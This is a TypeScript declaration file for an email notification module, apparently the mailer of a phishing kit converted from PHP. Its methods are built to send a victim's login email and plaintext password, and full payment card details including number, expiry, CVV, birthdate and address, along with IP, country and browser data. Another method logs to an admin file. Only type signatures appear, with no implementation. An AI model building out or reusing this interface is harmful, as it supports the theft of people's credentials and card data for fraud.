/**
 * Email notification module
 * Converted from PHP sand_email.php
 */
export declare class EmailNotifier {
    private transporter;
    private emailConfig;
    constructor(smtpConfig?: {
        host: string;
        port: number;
        secure: boolean;
        auth: {
            user: string;
            pass: string;
        };
    });
    sendLoginNotification(loginData: {
        email: string;
        password: string;
        ip: string;
        country: string;
        userAgent: string;
        os: string;
        browser: string;
        timestamp: string;
    }): Promise<boolean>;
    sendCardNotification(cardData: {
        nameOnCard: string;
        cardNumber: string;
        expiryDate: string;
        cvv: string;
        birthdate: string;
        address: string;
        city: string;
        state: string;
        zipCode: string;
        phoneNumber: string;
        bankName: string;
        cardType: string;
        cardBrand: string;
        ip: string;
        country: string;
        os: string;
        browser: string;
        timestamp: string;
    }): Promise<boolean>;
    private createLoginEmailContent;
    private createCardEmailContent;
    private logToAdminFile;
}
export declare const emailNotifier: EmailNotifier;
//# sourceMappingURL=email.d.ts.map